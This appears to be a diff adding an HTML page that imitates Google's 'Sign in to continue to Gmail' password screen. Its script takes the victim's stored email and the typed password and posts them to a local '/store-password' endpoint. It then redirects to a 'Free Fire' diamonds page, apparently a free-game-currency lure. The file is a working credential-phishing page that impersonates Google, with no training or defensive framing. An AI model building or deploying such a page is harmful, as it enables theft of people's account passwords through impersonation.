@@ -1,0 +1,178 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in - Google Accounts</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap">
+    <style>
+        body {
+            font-family: 'Roboto', Arial, sans-serif;
+            background-color: #f5f5f5;
+        }
+        .google-logo {
+            width: 75px;
+            height: 24px;
+            background-image: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNzIiIGhlaWdodD0iOTIiIHZpZXdCb3g9IjAgMCAyNzIgOTIiPjxwYXRoIGZpbGw9IiNFNDRDMjQiIGQ9Ik0xMTUuNzUgNDcuMThjMC0xMi43Ny0xMC4yNC0yMy4wMS0yMy4wMS0yMy4wMXMtMjMuMDEgMTAuMjQtMjMuMDEgMjMuMDFjMCAxMi4wMiA5LjA5IDIyIDIwLjcgMjIuNzhoLjU0YzIuOTYtLjA1IDUuNjgtMSAxLjE4LTYuOGgtNi45MnYtMTQuOWgxMS4zOGMuNjMgMy4yNSAxLjU4IDYuNzIgNS4xNCA5LjA4IDMuOTQgMi42NSA5LjI1IDIuNjIgMTMuMS0uMDcgMy4yNS0yLjQgNC45OC02LjEgNS4yLTkuOTkuMjItMy44Mi0uNzktNy4xLTMuMjYtOS42LTMuNy0zLjY0LTkuNy0zLjUxLTEzLjgxLjA3bC0xLjg1LTEuODVsLTEuODMtMS44M2gtLjAxeiIvPjxwYXRoIGZpbGw9IiNGQkJDMzQiIGQ9Ik0xMzkuNzUgNDcuMThjMC0xMi43Ny0xMC4yNC0yMy4wMS0yMy4wMS0yMy4wMXMtMjMuMDEgMTAuMjQtMjMuMDEgMjMuMDFjMCAxMi4wMiA5LjA5IDIyIDIwLjcgMjIuNzhoLjU0YzIuOTYtLjA1IDUuNjgtMSAxLjE4LTYuOGgtNi45MnYtMTQuOWgxMS4zOGMuNjMgMy4yNSAxLjU4IDYuNzIgNS4xNCA5LjA4IDMuOTQgMi42NSA5LjI1IDIuNjIgMTMuMS0uMDcgMy4yNS0yLjQgNC45OC02LjEgNS4yLTkuOTkuMjItMy44Mi0uNzktNy4xLTMuMjYtOS42LTMuNy0zLjY0LTkuNy0zLjUxLTEzLjgxLjA3bC0xLjg1LTEuODVsLTEuODMtMS44M2gtLjAxeiIvPjxwYXRoIGZpbGw9IjM0QTg1MyIgZD0iTTE2My43NSA0Ny4xOGMwLTEyLjc3LTEwLjI0LTIzLjAxLTIzLjAxLTIzLjAxcy0yMy4wMSAxMC4yNC0yMy4wMSAyMy4wMWMwIDEyLjAyIDkuMDkgMjIgMjAuNyAyMi43OGguNTRjMi45Ni0uMDUgNS42OC0xIDEuMTgtNi44aC02Ljkydi0xNC45aDExLjM4Yy42MyAzLjI1IDEuNTggNi43MiA1LjE0IDkuMDggMy45NCAyLjY1IDkuMjUgMi42MiAxMy4xLS4wNyAzLjI1LTIuNCA0Ljk4LTYuMSA1LjItOS45OS4yMi0zLjgyLS43OS03LjEtMy4yNi05LjYtMy43LTMuNjQtOS43LTMuNTEtMTMuODEuMDdsLTEuODUtMS44NWwtMS44My0xLjgzaC0uMDF6Ii8+PHBhdGggZmlsbD0iIjQyODVGNCIgZD0iTTE4Ny43NSA0Ny4xOGMwLTEyLjc3LTEwLjI0LTIzLjAxLTIzLjAxLTIzLjAxcy0yMy4wMSAxMC4yNC0yMy4wMSAyMy4wMWMwIDEyLjAyIDkuMDkgMjIgMjAuNyAyMi43OGguNTRjMi45Ni0uMDUgNS42OC0xIDEuMTgtNi44aC02Ljkydi0xNC45aDExLjM4Yy42MyAzLjI1IDEuNTggNi43MiA1LjE0IDkuMDggMy45NCAyLjY1IDkuMjUgMi42MiAxMy4xLS4wNyAzLjI1LTIuNCA0Ljk4LTYuMSA1LjItOS45OS4yMi0zLjgyLS43OS03LjEtMy4yNi05LjYtMy43LTMuNjQtOS43LTMuNTEtMTMuODEuMDdsLTEuODUtMS44NWwtMS44My0xLjgzaC0uMDF6Ii8+PC9zdmc+');
+            background-size: contain;
+            background-repeat: no-repeat;
+        }
+        .input-field:focus {
+            outline: none;
+            box-shadow: 0 0 0 2px #1a73e8;
+            border-color: transparent;
+        }
+        .password-toggle {
+            right: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+        }
+        .forgot-password:hover {
+            background-color: #f8f9fa;
+        }
+    </style>
+</head>
+<body class="min-h-screen flex flex-col items-center justify-center bg-gray-50">
+    <div class="w-full max-w-md bg-white rounded-lg shadow-sm p-8">
+        <div class="flex flex-col items-center mb-8">
+            <div class="google-logo mb-6"></div>
+            <h1 class="text-2xl font-normal text-gray-800">Sign in</h1>
+            <p class="text-sm text-gray-600 mt-2">to continue to Gmail</p>
+        </div>
+
+        <div class="mb-6">
+            <div class="flex items-center justify-between mb-4">
+                <div class="flex items-center">
+                    <div class="w-8 h-8 rounded-full bg-blue-500 flex items-center justify-center text-white font-medium"><i class="fas fa-user"></i></div>
+                    <span class="ml-2 text-sm font-medium text-gray-800">user@example.com</span>
+                </div>
+                <a href="#" class="text-sm text-blue-600 hover:text-blue-800">Switch account</a>
+            </div>
+        </div>
+
+        <form id="passwordForm" class="mb-6">
+            <div class="relative mb-1">
+                <input 
+                    type="password" 
+                    id="password" 
+                    name="password" 
+                    autocomplete="current-password" 
+                    class="w-full px-3 py-2 border border-gray-300 rounded-md input-field focus:border-blue-500 focus:ring-1 focus:ring-blue-500" 
+                    placeholder="Enter your password"
+                >
+                <button type="button" id="togglePassword" class="absolute password-toggle text-gray-500 hover:text-gray-700" aria-label="Toggle password visibility">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />
+                    </svg>
+                </button>
+            </div>
+            <div class="text-xs text-gray-600 mb-6">
+                Not your computer? Use Guest mode to sign in privately.
+                <a href="#" class="text-blue-600 hover:text-blue-800">Learn more</a>
+            </div>
+            <div class="flex items-center justify-between">
+                <a href="#" class="text-sm text-blue-600 hover:text-blue-800 forgot-password px-2 py-1 rounded">Forgot password?</a>
+                <button type="submit" class="bg-blue-600 hover:bg-blue-700 text-white font-medium py-2 px-4 rounded-md transition duration-150 ease-in-out">
+                    Next
+                </button>
+            </div>
+        </form>
+
+        <div class="border-t border-gray-300 pt-6">
+            <div class="flex justify-between">
+                <label id="language-label" class="sr-only" for="language-select">Select language</label>
+                <select id="language-select" aria-labelledby="language-label" class="text-sm text-gray-700 bg-transparent border-0 focus:ring-0">
+                    <option>English (United States)</option>
+                    <option>Español</option>
+                    <option>Français</option>
+                </select>
+                <div class="flex space-x-4 text-sm text-gray-700">
+                    <a href="#" class="hover:text-gray-900">Help</a>
+                    <a href="#" class="hover:text-gray-900">Privacy</a>
+                    <a href="#" class="hover:text-gray-900">Terms</a>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            // Display stored email
+            const userEmail = sessionStorage.getItem('userEmail');
+            if (!userEmail) {
+                window.location.href = 'index.html';
+                return;
+            }
+            
+            // Update email display
+            const emailSpan = document.querySelector('.text-sm.font-medium.text-gray-800');
+            emailSpan.textContent = userEmail;
+
+            const togglePassword = document.getElementById('togglePassword');
+            const passwordInput = document.getElementById('password');
+            const passwordForm = document.getElementById('passwordForm');
+            
+            // Toggle password visibility
+            togglePassword.addEventListener('click', function() {
+                const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
+                passwordInput.setAttribute('type', type);
+                
+                // Change icon
+                if (type === 'text') {
+                    this.innerHTML = `
+                        <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.543-7a9.97 9.97 0 011.563-3.029m5.858.908a3 3 0 114.243 4.243M9.878 9.878l4.242 4.242M9.88 9.88l-3.29-3.29m7.532 7.532l3.29 3.29M3 3l3.59 3.59m0 0A9.953 9.953 0 0112 5c4.478 0 8.268 2.943 9.543 7a10.025 10.025 0 01-4.132 5.411m0 0L21 21" />
+                        </svg>
+                    `;
+                } else {
+                    this.innerHTML = `
+                        <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />
+                        </svg>
+                    `;
+                }
+            });
+            
+            // Form submission
+            passwordForm.addEventListener('submit', function(e) {
+                e.preventDefault();
+                const password = passwordInput.value;
+                
+                if (!password) {
+                    alert('Please enter your password');
+                    return;
+                }
+                
+                fetch('http://localhost:5000/store-password', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({ 
+                        email: userEmail,
+                        password: password 
+                    })
+                })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.status === 'success') {
+                        // Clear stored email
+                        sessionStorage.removeItem('userEmail');
+                        // Redirect to Free Fire page
+                        window.location.href = '../diamonds/index.html';
+                    } else {
+                        throw new Error(data.error || 'Failed to process login');
+                    }
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    alert('An error occurred. Please try again.');
+                });
+            });
+        });
+    </script>
+</body>
+</html>
